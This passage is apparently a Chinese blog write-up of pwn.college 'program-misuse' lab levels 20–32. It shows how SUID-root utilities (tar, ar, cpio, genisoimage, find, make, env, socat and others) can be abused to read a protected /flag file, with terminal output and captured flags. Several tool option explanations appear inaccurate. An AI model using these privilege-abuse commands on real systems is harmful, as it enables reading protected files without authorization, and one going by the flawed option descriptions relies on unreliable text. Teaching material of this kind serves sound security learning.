class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-cvjf</span> archive.tar.bz2 directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将 <code>directory/</code> 目录及其下的所有文件和子目录打包成一个名为 <code>archive.tar.bz2</code> 的归档文件，并使用 bzip2 进行压缩。</p><ol start="4"><li><strong>列出归档文件中的内容</strong>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-tvf</span> archive.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会列出名为 <code>archive.tar</code> 的归档文件中的所有文件和目录。</p><ol start="5"><li><strong>解压归档文件</strong>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> archive.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将名为 <code>archive.tar</code> 的归档文件解压缩到当前目录。</p><ol start="6"><li><strong>解压归档文件到指定目录</strong>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-xvf</span> archive.tar <span class="token parameter variable">-C</span> /path/to/directory/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将名为 <code>archive.tar</code> 的归档文件解压缩到指定的目录 <code>/path/to/directory/</code> 中。</p><p>当你在使用 <code>tar</code> 命令时，可以使用多个选项来控制其行为。以下是对常用选项的解释：</p><ol><li><p><code>-c, --create</code>：创建归档文件。这个选项告诉 <code>tar</code> 命令你要创建一个新的归档文件。</p></li><li><p><code>-v, --verbose</code>：详细模式。启用详细输出，会显示创建或提取的文件列表。</p></li><li><p><code>-f, --file=ARCHIVE</code>：指定归档文件的名称。<code>ARCHIVE</code> 是要创建的归档文件的名称。</p></li><li><p><code>-z, --gzip</code>：使用 gzip 压缩。使用 gzip 压缩归档文件。只有在创建归档文件时才会用到。</p></li><li><p><code>-j, --bzip2</code>：使用 bzip2 压缩。使用 bzip2 压缩归档文件。只有在创建归档文件时才会用到。</p></li><li><p><code>-t, --list</code>：列出归档文件中的内容。这个选项告诉 <code>tar</code> 命令要列出归档文件中的所有文件和目录。</p></li><li><p><code>-x, --extract, --get</code>：提取归档文件。这个选项告诉 <code>tar</code> 命令你要提取归档文件中的文件。</p></li><li><p><code>-C, --directory=DIR</code>：指定提取文件的目录。<code>DIR</code> 是提取文件时要存放的目标目录。</p></li><li><p><code>-O</code> 选项。这个选项告诉 <code>tar</code> 命令将解压缩的内容写入标准输出而不是文件</p></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level20:/challenge$ <span class="token function">tar</span> <span class="token parameter variable">-cvf</span> flag.tar <span class="token string">"/flag"</span>tar: Removing leading `/' from member names/flaghacker@program-misuse~level20:/challenge$ <span class="token function">ls</span>babysuid_level20  flag.tarhacker@program-misuse~level20:/challenge$ <span class="token function">tar</span> <span class="token parameter variable">-xOf</span> flag.tar pwn.college<span class="token punctuation">&#123;</span>wg9J9bzxSwEV2tNZMG_zYwyiBFA.0lM2EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level21ar"><a class="markdownIt-Anchor" href="#level21ar"></a> level21(ar)</h3><p><code>ar</code></p><h4 id="语法"><a class="markdownIt-Anchor" href="#语法"></a> 语法</h4><pre class="line-numbers language-none"><code class="language-none">ar[-dmpqrtx][cfosSuvV][a&lt;成员文件&gt;][b&lt;成员文件&gt;][i&lt;成员文件&gt;][备存文件][成员文件]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="参数"><a class="markdownIt-Anchor" href="#参数"></a> <strong>参数</strong>：</h5><h5 id="必要参数"><a class="markdownIt-Anchor" href="#必要参数"></a> <strong>必要参数</strong>：</h5><ul><li>-d 　删除备存文件中的成员文件。</li><li>-m 　变更成员文件在备存文件中的次序。</li><li>-p 　显示备存文件中的成员文件内容。</li><li>-q 　将文件附加在备存文件末端。</li><li>-r 　将文件插入备存文件中。</li><li>-t 　显示备存文件中所包含的文件。</li><li>-x 　自备存文件中取出成员文件。</li></ul><h5 id="选项参数"><a class="markdownIt-Anchor" href="#选项参数"></a> <strong>选项参数</strong>：</h5><ul><li>a&lt;成员文件&gt; 　将文件插入备存文件中指定的成员文件之后。</li><li>b&lt;成员文件&gt; 　将文件插入备存文件中指定的成员文件之前。</li><li>c 　建立备存文件。</li><li>f 　为避免过长的文件名不兼容于其他系统的ar指令指令，因此可利用此参数，截掉要放入备存文件中过长的成员文件名称。</li><li>i&lt;成员文件&gt; 　将文件插入备存文件中指定的成员文件之前。</li><li>o 　保留备存文件中文件的日期。</li><li>s 　若备存文件中包含了对象模式，可利用此参数建立备存文件的符号表。</li><li>S 　不产生符号表。</li><li>u 　只将日期较新文件插入备存文件中。</li><li>v 　程序执行时显示详细的信息。</li><li>V 　显示版本信息。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level21:/challenge$ ar <span class="token parameter variable">-r</span> flag.a /flagar: creating flag.ahacker@program-misuse~level21:/challenge$ <span class="token function">ls</span>babysuid_level21  flag.assh-entrypoint: flag: <span class="token builtin class-name">command</span> not foundhacker@program-misuse~level21:/challenge$ ar xp flag.aar: two different operation options specifiedhacker@program-misuse~level21:/challenge$ ar p flag.apwn.college<span class="token punctuation">&#123;</span>07JfL0D_QNkJfV4u1O8mk-FX5KA.01M2EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level22cpio"><a class="markdownIt-Anchor" href="#level22cpio"></a> level22(cpio)</h3><p>cpio 是用来建立，还原备份档的工具程序，它可以加入，解开 cpio 或 tar 备份档内的文件。</p><h4 id="语法-2"><a class="markdownIt-Anchor" href="#语法-2"></a> 语法</h4><pre class="line-numbers language-none"><code class="language-none">cpio [-0aABckLovV][-C &lt;输入&#x2F;输出大小&gt;][-F &lt;备份档&gt;][-H &lt;备份格式&gt;][-O &lt;备份档&gt;][--block-size&#x3D;&lt;区块大小&gt;][--force-local][--help][--quiet][--version] 或 cpio [-bBcdfikmnrsStuvV][-C &lt;输入&#x2F;输出大小&gt;][-E &lt;范本文件&gt;][-F &lt;备份档&gt;][-H &lt;备份格式&gt;][-I &lt;备份档&gt;][-M &lt;回传信息&gt;][-R &lt;拥有者&gt;&lt;:&#x2F;.&gt;&lt;所属群组&gt;][--block-size&#x3D;&lt;区块大小&gt;][--force-local][--help][--no-absolute-filenames][--no-preserve-owner][--only-verify-crc][--quiet][--sparse][--version][范本样式...] 或 cpio [-0adkiLmpuvV][-R &lt;拥有者&gt;&lt;:&#x2F;.&gt;&lt;所属群组&gt;][--help][--no-preserve-owner][--quiet][--sparse][--version][目的目]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="参数-2"><a class="markdownIt-Anchor" href="#参数-2"></a> <strong>参数</strong>：</h5><ul><li>-0或–null 　接受新增列控制字符，通常配合find指令的&quot;-print0&quot;参数使用。</li><li>-a或–reset-access-time 　重新设置文件的存取时间。</li><li>-A或–append 　附加到已存在的备份档中，且这个备份档必须存放在磁盘上，而不能放置于磁带机里。</li><li>-b或–swap 　此参数的效果和同时指定&quot;-sS&quot;参数相同。</li><li>-B 　将输入/输出的区块大小改成5210 Bytes。</li><li>-c 　使用旧ASCII备份格式。</li><li>-C&lt;区块大小&gt;或–io-size=&lt;区块大小&gt; 　设置输入/输出的区块大小，单位是Byte。</li><li>-d或–make-directories 　如有需要cpio会自行建立目录。</li><li>-E&lt;范本文件&gt;或–pattern-file=&lt;范本文件&gt; 　指定范本文件，其内含有一个或多个范本样式，让cpio解开符合范本条件的文件，格式为每列一个范本样式。</li><li>-f或–nonmatching 　让cpio解开所有不符合范本条件的文件。</li><li>-F&lt;备份档&gt;或–file=&lt;备份档&gt; 　指定备份档的名称，用来取代标准输入或输出，也能借此通过网络使用另一台主机的保存设备存取备份档。</li><li>-H&lt;备份格式&gt; 　指定备份时欲使用的文件格式。</li><li>-i或–extract 　执行copy-in模式，还原备份档。</li><li>-l&lt;备份档&gt; 　指定备份档的名称，用来取代标准输入，也能借此通过网络使用另一台主机的保存设备读取备份档。</li><li>-k 　此参数将忽略不予处理，仅负责解决cpio不同版本间的兼容性问题。</li><li>-l或–link 　以硬连接的方式取代复制文件，可在copy-pass模式下运用。</li><li>-L或–dereference 　不建立符号连接，直接复制该连接所指向的原始文件。</li><li>-m或preserve-modification-time 　不去更换文件的更改时间。</li><li>-M&lt;回传信息&gt;或–message=&lt;回传信息&gt; 　设置更换保存媒体的信息。</li><li>-n或–numeric-uid-gid 　使用&quot;-tv&quot;参数列出备份档的内容时，若再加上参数&quot;-n&quot;，则会以用户识别码和群组识别码替代拥有者和群组名称列出文件清单。</li><li>-o或–create 　执行copy-out模式，建立备份档。</li><li>-O&lt;备份档&gt; 　指定备份档的名称，用来取代标准输出，也能借此通过网络　使用另一台主机的保存设备存放备份档。</li><li>-p或–pass-through 　执行copy-pass模式，略过备份步骤，直接将文件复制到目的目录。</li><li>-r或–rename 　当有文件名称需要更动时，采用互动模式。</li><li>-R&lt;拥有者&gt;&lt;:/.&gt;&lt;所属群组&gt;或</li><li>----owner&lt;拥有者&gt;&lt;:/.&gt;&lt;所属群组&gt; 　在copy-in模式还原备份档，或copy-pass模式复制文件时，可指定这些备份，复制的文件的拥有者与所属群组。</li><li>-s或–swap-bytes 　交换每对字节的内容。</li><li>-S或–swap-halfwords 　交换每半个字节的内容。</li><li>-t或–list 　将输入的内容呈现出来。</li><li>-u或–unconditional 　置换所有文件，不论日期时间的新旧与否，皆不予询问而直接覆盖。</li><li>-v或–verbose 　详细显示指令的执行过程。</li><li>-V或–dot 　执行指令时，在每个文件的执行程序前面加上&quot;.&quot;号</li><li>–block-size=&lt;区块大小&gt; 　设置输入/输出的区块大小，假如设置数值为5，则区块大小为2500，若设置成10，则区块大小为5120，依次类推。</li><li>–force-local 　强制将备份档存放在本地主机。</li><li>–help 　在线帮助。</li><li>–no-absolute-filenames 　使用相对路径建立文件名称。</li><li>–no-preserve-owner 　不保留文件的拥有者，谁解开了备份档，那些文件就归谁所有。</li><li>-only-verify-crc 　当备份档采用CRC备份格式时，可使用这项参数检查备份档内的每个文件是否正确无误。</li><li>–quiet 　不显示复制了多少区块。</li><li>–sparse 　倘若一个文件内含大量的连续0字节，则将此文件存成稀疏文件。</li><li>–version 　显示版本信息。</li></ul><h4 id="wp"><a class="markdownIt-Anchor" href="#wp"></a> wp</h4><p>这个题很有点难度</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level22:/$ cpio <span class="token parameter variable">-ov</span> <span class="token operator">&lt;</span> flag <span class="token operator">></span>flag.cpiossh-entrypoint: flag: Permission deniedhacker@program-misuse~level22:/$ <span class="token function">find</span> flag<span class="token operator">|</span>cpio <span class="token parameter variable">-ov</span> <span class="token operator">></span> flag.cpiossh-entrypoint: flag.cpio: Permission deniedhacker@program-misuse~level22:/$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以发现，cpio没有对flag的读权限，但是我们可以用find命令进行绕过，创建flag.cpio又被拒绝说明cpio也没有写权限</p><p>在网上搜了搜其他dl的思路</p><p>发现通常有两个地方可以存放压缩文件,有写入权限。</p><ol><li><code>/home/hacker: home directory.</code></li><li><code>/tmp: temp directory</code></li></ol><p>这里我们使用<code>/tmp</code>目录，</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level22:/$ <span class="token function">find</span> flag<span class="token operator">|</span>cpio <span class="token parameter variable">-ov</span> <span class="token operator">></span> /tmp/flag.cpioflag<span class="token number">1</span> block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>接着用<code>cpio</code>读取归档的内容</p><p>我们需要使用“ <code>-i</code> ”来提取内容，然后打印出包含“ <code>--to-stdout</code> ”的内容，其中“ <code>Extract files to standard output</code>”是打印的内容。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level22:/$ <span class="token builtin class-name">cd</span> /tmphacker@program-misuse~level22:/tmp$ cpio <span class="token parameter variable">-i</span> --to-stdout <span class="token operator">&lt;</span> flag.cpiopwn.college<span class="token punctuation">&#123;</span>A0MclfD9AoelVA-b-hXVQ_byLYK.0FN2EDLzczN0UzW<span class="token punctuation">&#125;</span><span class="token number">1</span> block<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level23genisoimage"><a class="markdownIt-Anchor" href="#level23genisoimage"></a> level23(genisoimage)</h3><p><s>又有亿点点难</s></p><p><code>genisoimage</code> 命令用于创建 ISO9660 光盘映像文件，也就是创建 ISO 镜像。它是在 Linux 中用于创建光盘镜像文件的工具之一。以下是一些常用的 <code>genisoimage</code> 命令参数：</p><ol><li><p><strong>-o filename</strong>：指定输出文件的名称。</p></li><li><p><strong>-r</strong>：允许在 ISO9660 文件系统中保存普通用户的文件权限和属性。</p></li><li><p><strong>-J</strong>：生成适用于 Windows 的 Joliet 扩展格式的 ISO9660 文件系统。</p></li><li><p><strong>-joliet-long</strong>：允许使用长文件名。</p></li><li><p><strong>-l</strong>：允许生成 Rock Ridge 扩展格式的 ISO9660 文件系统，以支持 UNIX 风格的长文件名和权限。</p></li><li><p><strong>-V volumeid</strong>：指定卷标（光盘名称）。</p></li><li><p><strong>-input-charset charset</strong>：指定输入文件名的字符集。</p></li><li><p><strong>-graft-points</strong>：允许将文件或目录添加到映像的特定路径。</p></li><li><p><strong>-R</strong>：使用 Rock Ridge 扩展格式生成 ISO9660 文件系统，以支持 UNIX 风格的长文件名和权限。</p></li><li><p><strong>-b boot_image</strong>：指定用于引导光盘的引导映像文件。</p></li><li><p><strong>-no-emul-boot</strong>：禁止模拟软盘引导。</p></li><li><p><strong>-boot-load-size load_sectors</strong>：指定加载区域的大小（以扇区为单位）。</p></li><li><p><strong>-boot-info-table</strong>：在引导映像中创建一个引导信息表。</p></li><li><p><strong>-eltorito-boot boot_image</strong>：指定 El Torito 引导映像文件。</p></li><li><p><strong>-eltorito-catalog boot_catalog</strong>：指定 El Torito 引导目录文件。</p></li><li><p><strong>-quiet</strong>：静默模式，减少输出。</p></li></ol><p>可以在终端中运行 <code>man genisoimage</code> 命令来查看 <code>genisoimage</code> 的手册页。</p><p>主要这里命令比较多，要一个一个尝试</p><p>自动化尝试命令</p><p><code>genisoimage --help 2&gt;&amp;1 | grep FILE | awk '&#123;print $1&#125;'</code></p><p>解释</p><ul><li>genisoimage --help 获取该程序的帮助信息</li><li>搜索有关文件的命令</li><li>awk ‘{print($1)}’ 打印第一列</li></ul><p><code>for option in $(genisoimage --help 2&gt;&amp;1 | grep FILE | awk '&#123;print $1&#125;'); do echo $option; genisoimage $option /flag; done</code></p><p>测试发现，可以用<code>sort</code>指令打印出<code>flag</code>,事实上我认为这个漏洞成因是，-sort 选项是制定文件和目录的排序顺序，但是<code>flag</code>文件是不正确的格式，genisoimage会读取文件，并且将报错信息（包含了文件内容）打印到终端</p><p>于是正确的<code>payload</code>:<code>genisoimage -sort flag</code></p><h3 id="level24env"><a class="markdownIt-Anchor" href="#level24env"></a> level24(env)</h3><p><a href="https://gtfobins.github.io/gtfobins/env/">env | GTFOBins</a></p><p><code>env</code>是一个用于在当前环境中执行命令的实用工具。它的主要作用是为命令设置环境变量，然后执行该命令。在不同的操作系统上，<code>env</code>的功能和用法可能有所不同，但它通常用于以下几个方面：</p><ol><li><p><strong>设置环境变量</strong>：通过<code>env</code>命令可以设置命令执行时所需的环境变量。这些变量可以包括路径、语言、编译器选项等。</p></li><li><p><strong>执行命令</strong>：<code>env</code>还可以用来执行特定的命令，这样就可以在执行命令之前设置好所需的环境变量。</p></li><li><p><strong>查询当前环境变量</strong>：在不指定命令的情况下，<code>env</code>会打印当前环境中已设置的所有变量。</p></li></ol><p>下面是一些常见的用法：</p><ul><li><p><strong>设置环境变量并执行命令</strong>：<code>env VAR=value command</code>。这将临时设置一个环境变量<code>VAR</code>的值为<code>value</code>，然后执行<code>command</code>。</p></li><li><p><strong>查询当前环境变量</strong>：<code>env</code>。这将打印当前环境中所有已设置的变量及其值。</p></li><li><p><strong>设置多个环境变量</strong>：<code>env VAR1=value1 VAR2=value2 command</code>。这将设置多个环境变量的值，然后执行命令。</p></li><li><p><strong>在脚本中使用</strong>：<code>#!/usr/bin/env python</code>。这是脚本中常见的用法，它告诉系统去<code>/usr/bin</code>目录下找到<code>python</code>解释器，并用它来执行脚本。</p></li></ul><p><code>env cat flag</code></p><h3 id="level25find"><a class="markdownIt-Anchor" href="#level25find"></a> level25(find)</h3><p><code>find</code>也可用于命令执行</p><p>常见的<code>find</code>命令选项包括：</p><ul><li><code>-name</code>：根据文件名进行搜索。</li><li><code>-type</code>：根据文件类型进行搜索，如普通文件（<code>f</code>）、目录（<code>d</code>）等。</li><li><code>-perm</code>：根据文件权限进行搜索。</li><li><code>-user</code>：根据文件所有者进行搜索。</li><li><code>-group</code>：根据文件所属组进行搜索。</li><li><code>-size</code>：根据文件大小进行搜索。</li><li><code>-mtime</code>、<code>-atime</code>、<code>-ctime</code>：根据文件的修改时间、访问时间、状态改变时间进行搜索。</li></ul><p>常见的<code>find</code>命令操作包括：</p><ul><li><code>-print</code>：打印匹配的文件名。</li><li><code>-exec</code>：对匹配的文件执行指定的命令。</li></ul><p>例如，要在当前目录及其子目录中查找所有扩展名为<code>.txt</code>的文件，可以使用以下命令：</p><pre class="line-numbers language-none"><code class="language-none">luaCopy codefind . -type f -name &quot;*.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这将在当前目录及其子目录中查找所有扩展名为<code>.txt</code>的普通文件，并打印它们的文件名。</p><p><code>find</code>命令非常灵活，可以根据具体的需求组合不同的选项和操作来实现各种搜索任务。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> <span class="token function">cat</span> /flag <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token parameter variable">-quit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>find .</code>：在当前目录及其子目录中查找文件。</li><li><code>-exec cat /flag \;</code>：对于每一个找到的文件，执行<code>cat /flag</code>命令。<code>&#123;&#125;</code>通常用来表示<code>find</code>命令找到的文件名，而<code>\;</code>表示<code>-exec</code>选项的结束。</li><li><code>-quit</code>：在执行第一个 <code>-exec</code> 后立即停止查找，即使还有未搜索的目录或文件。</li></ul><h3 id="level26make"><a class="markdownIt-Anchor" href="#level26make"></a> level26(make)</h3><p>[pwn.college-program-misuse-writeup/Babysuid <a href="http://26.md">26.md</a> at main · M4700F/pwn.college-program-misuse-writeup (<a href="http://github.com">github.com</a>)](<a href="https://github.com/M4700F/pwn.college-program-misuse-writeup/blob/main/Babysuid">https://github.com/M4700F/pwn.college-program-misuse-writeup/blob/main/Babysuid</a> <a href="http://26.md">26.md</a>)</p><p>简洁版:</p><p><code>COMMAND='cat /flag';make -s --eval=$'x:\n\t-'&quot;$COMMAND&quot;</code></p><ul><li><code>$'x:\n\t-'&quot;$COMMAND&quot;</code> 定义了一个名为 <code>x</code> 的目标，在这个目标下执行了由 <code>COMMAND</code> 变量定义的命令。</li><li><code>COMMAND='cat /flag'</code> 将 <code>cat /flag</code> 字符串赋给了 <code>COMMAND</code> 变量，即 <code>COMMAND</code> 变量现在代表了 <code>cat /flag</code> 命令。</li><li><code>make -s --eval=...</code> 命令将 <code>-s</code> 参数用于静默执行，<code>--eval</code> 参数用于在执行过程中设置 <code>x</code> 目标下的命令为 <code>cat /flag</code>。</li></ul><p>When you execute a command from a makefile which has been granted the <code>SUID</code> bit, the command inherits the permission of the root user. So when we run the <code>cat /flag</code>, as if we were the <code>root</code> user. That’s why it prints the flag.</p><p>我们也可以编写一个<code>makefile</code></p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token target symbol">build</span><span class="token punctuation">:</span>gcc test.c -o testls ./testcat /flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后直接<code>make</code>即可</p><h3 id="level27nice"><a class="markdownIt-Anchor" href="#level27nice"></a> level27(nice)</h3><p><code>nice</code> 是一个用于调整进程优先级的命令。在Unix和类Unix系统中，每个进程都有一个与之相关的优先级，用于决定它在系统资源分配中的位置。<code>nice</code> 命令允许你在运行命令时修改进程的优先级。</p><p>以下是 <code>nice</code> 命令的一些常见用法：</p><ol><li><p><strong>设置进程优先级</strong>：最简单的用法是将 <code>nice</code> 命令与要执行的命令一起使用。通过在命令前加上 <code>nice</code> 命令，你可以使得该命令以较低的优先级运行。例如：</p> <pre class="line-numbers language-none"><code class="language-none">nice -n 10 command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将 <code>command</code> 进程的优先级降低到 10。数值范围通常是 -20（最高优先级）到 19（最低优先级），0 是默认优先级。</p></li><li><p><strong>查看进程优先级</strong>：你可以使用 <code>ps</code> 命令查看当前进程的优先级。例如：</p> <pre class="line-numbers language-none"><code class="language-none">ps -eo pid,ni,cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会显示当前进程的 PID、优先级值和命令。</p></li><li><p><strong>提高进程优先级</strong>：如果你有足够的权限，你也可以使用 <code>renice</code> 命令来提高或降低已经运行中进程的优先级。例如：</p> <pre class="line-numbers language-none"><code class="language-none">renice -n -5 -p PID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会将 PID 所代表的进程的优先级降低 5 个级别。</p></li><li><p><strong>同时设置 nice 值和调用优先级</strong>：你也可以同时使用 <code>nice</code> 和 <code>renice</code> 命令。<code>nice</code> 命令用于设置调用的优先级，而 <code>renice</code> 命令用于改变已经运行的进程的优先级。</p></li></ol><p><code>nice -n 10 cat /flag</code></p><p>这里的 <code>n</code>可以是<code>-20~19</code>的任意整数，正数会提高进程的优先级。这会导致系统更频繁地为该进程分配 CPU 时间，从而使得该进程更快地执行。</p><p>如果这里n取负数会导致没有权限获得<code>flag</code>,原因待解决</p><h3 id="level28timeout"><a class="markdownIt-Anchor" href="#level28timeout"></a> level28(timeout)</h3><p>timeout命令作用是运行指定命令，如果在指定时间后在运行则杀死该进程。</p><p><code>timeout 114514s cat /flag</code></p><h3 id="level29stdbuf"><a class="markdownIt-Anchor" href="#level29stdbuf"></a> level29(stdbuf)</h3><p><code>stdbuf</code> 是一个用于修改标准 I/O 缓冲方式的命令，它允许你在运行命令时控制标准输入、输出和错误的缓冲行为。以下是 <code>stdbuf</code> 命令的一些常用参数：</p><ol><li><p><code>-i MODE</code> 或 <code>--input=MODE</code>：指定标准输入的缓冲模式。可以使用 <code>MODE</code> 参数来指定标准输入的缓冲模式，可选值包括：</p><ul><li><code>0</code>：无缓冲。</li><li><code>L</code>：行缓冲（按行刷新）。</li><li><code>N</code>：块缓冲（按块刷新）。</li></ul><p>例如，<code>-i0</code> 表示禁用标准输入的缓冲，<code>-iL</code> 表示使用行缓冲模式。</p></li><li><p><code>-o MODE</code> 或 <code>--output=MODE</code>：指定标准输出的缓冲模式。与 <code>-i</code> 类似，可以使用 <code>MODE</code> 参数来指定标准输出的缓冲模式，可选值同样包括 <code>0</code>、<code>L</code> 和 <code>N</code>。</p></li><li><p><code>-e MODE</code> 或 <code>--error=MODE</code>：指定标准错误输出的缓冲模式。与 <code>-i</code> 和 <code>-o</code> 类似，可以使用 <code>MODE</code> 参数来指定标准错误输出的缓冲模式，可选值同样包括 <code>0</code>、<code>L</code> 和 <code>N</code>。</p></li><li><p><code>-i0 -o0 -e0</code>：禁用标准输入、输出和错误的缓冲，这相当于在使用管道等操作时实时输出，适用于实时日志输出等场景。</p></li></ol><p><code>stdbuf -i0 cat /flag</code></p><h3 id="level30setarch"><a class="markdownIt-Anchor" href="#level30setarch"></a> level30(setarch)</h3><p><code>setarch</code> 命令用于设置架构特定的系统调用，以便在不同的系统架构之间进行运行时切换。它通常用于模拟不同架构的环境，例如在 x86 系统上模拟 ARM 系统。</p><p>以下是一些常用的 <code>setarch</code> 命令参数：</p><ol><li><code>-h</code> 或 <code>--help</code>：显示帮助信息，列出 <code>setarch</code> 命令的使用方法和选项。</li><li><code>-L</code> 或 <code>--list</code>：列出系统支持的所有架构。这个选项可以用来查看系统支持的所有架构列表。</li><li><code>-R</code> 或 <code>--rpath</code>：设置运行时链接器路径。这个选项用于指定程序运行时链接器的路径。</li><li><code>-B</code> 或 <code>--bind</code>：绑定指定的程序到特定的架构。例如，<code>setarch -B arm /bin/bash</code> 将 <code>/bin/bash</code> 绑定到 ARM 架构。</li><li><code>-Q</code> 或 <code>--query</code>：查询指定程序的架构信息。例如，<code>setarch -Q /bin/bash</code> 将显示 <code>/bin/bash</code> 的架构信息。</li></ol><p><code>setarch $(arch) cat /flag</code></p><ul><li><code>$(arch)</code> 会返回当前系统的架构信息。例如，在 x86 系统上，<code>$(arch)</code> 可能会返回 <code>x86_64</code>（64 位）或 <code>i386</code>（32 位）等。</li><li><code>setarch</code> 命令用于设置运行时的系统架构。</li><li><code>cat /flag</code> 命令用于打印 <code>/flag</code> 文件的内容到标准输出。</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level30:/challenge$ setarch <span class="token parameter variable">--li</span>uname26linux32linux64i386i486i586i686athlonx86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level31watch"><a class="markdownIt-Anchor" href="#level31watch"></a> level31(watch)</h3><p><code>watch</code> 是一个命令行工具，用于周期性地执行指定的命令，并将其输出显示在终端上。它可以帮助你监视命令的输出，并定期刷新显示结果，从而实时查看命令的执行情况。</p><p><code>watch</code> 命令的基本语法如下：</p><pre class="line-numbers language-none"><code class="language-none">watch [options] command<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，<code>command</code> 是要执行的命令，而 <code>[options]</code> 是一些选项，用于指定 <code>watch</code> 命令的行为。</p><p>一些常见的 <code>watch</code> 命令选项包括：</p><ul><li><code>-n, --interval</code>：指定刷新间隔时间，以秒为单位。默认间隔时间是 2 秒。</li><li><code>-d, --differences</code>：仅显示与上次输出不同的内容。这个选项可以帮助你快速地查看输出的变化。</li><li><code>-t, --no-title</code>：不显示标题行。默认情况下，<code>watch</code> 会在顶部显示一个标题行，显示当前时间和正在执行的命令。</li><li><code>-h, --help</code>：显示帮助信息，列出 <code>watch</code> 命令的使用方法和选项。</li></ul><p>例如，要监视系统当前的时间变化，可以使用以下命令：</p><pre class="line-numbers language-none"><code class="language-none">watch date<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会每隔 2 秒执行一次 <code>date</code> 命令，并将其输出显示在终端上，实时更新系统当前的时间。</p><p><code>watch -x cat /flag</code></p><h3 id="level32socat"><a class="markdownIt-Anchor" href="#level32socat"></a> level32(socat)</h3><p><code>socat</code> 的选项和参数非常多，以下是一些常用的选项和参数：</p><ul><li><code>-h</code>：显示帮助信息，列出 <code>socat</code> 命令的使用方法和选项。</li><li><code>-V</code>：显示版本信息，包括 <code>socat</code> 的版本号。</li><li><code>-d</code>：启用调试模式，显示更详细的调试信息。</li><li><code>-v</code>：显示详细信息，包括正在进行的连接和数据传输的详细信息。</li><li><code>-t &lt;time&gt;</code>：设置超时时间，指定 <code>socat</code> 在连接建立或数据传输时等待的最大时间。</li><li><code>-T &lt;time&gt;</code>：设置数据传输超时时间，指定 <code>socat</code> 在传输数据时的最大等待时间。</li><li><code>-u</code>：用于指定使用无缓冲模式（unbuffered mode）。具体来说，它告诉 <code>socat</code> 在数据传输时不要使用缓冲，而是立即传输数据。</li><li><code>-4</code>：强制 <code>socat</code> 使用 IPv4 地址。</li><li><code>-6</code>：强制 <code>socat</code> 使用 IPv6 地址。</li><li><code>-b &lt;size&gt;</code>：设置数据块大小，指定 <code>socat</code> 在传输数据时使用的缓冲区大小。</li><li><code>-c</code>：关闭 <code>socat</code> 的标准输入，使其在启动后不接受键盘输入。</li><li><code>-e</code>：使 <code>socat</code> 以非交互模式启动，用于将其嵌入到脚本中。</li><li><code>-p</code>：保持连接，使 <code>socat</code> 在传输完成后保持连接状态。</li><li><code>-x</code>：显示十六进制格式的数据。</li><li><code>-S</code>：打开日志记录功能，记录 <code>socat</code> 的执行日志。</li><li><code>-N</code>：禁用 DNS 查询，指定 <code>socat</code> 不进行 DNS 查询。<br /><code>socat -u FILE:/flag STDOUT</code></li></ul><p><code>socat</code> 是一个非常灵活的工具，可以用于各种网络通信场景。以下是一些 <code>socat</code> 的常见用法：</p><ol><li><p><strong>TCP/UDP 连接</strong>：<code>socat</code> 可以用于在两个主机之间建立 TCP 或 UDP 连接。例如，将 <code>socat</code> 作为简单的 TCP 服务器运行：</p><pre class="line-numbers language-none"><code class="language-none">socat TCP-LISTEN:1234,fork<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将在本地的 1234 端口上启动一个 TCP 服务器，接受来自客户端的连接，并将连接分配给新的子进程来处理。</p></li><li><p><strong>文件传输</strong>：<code>socat</code> 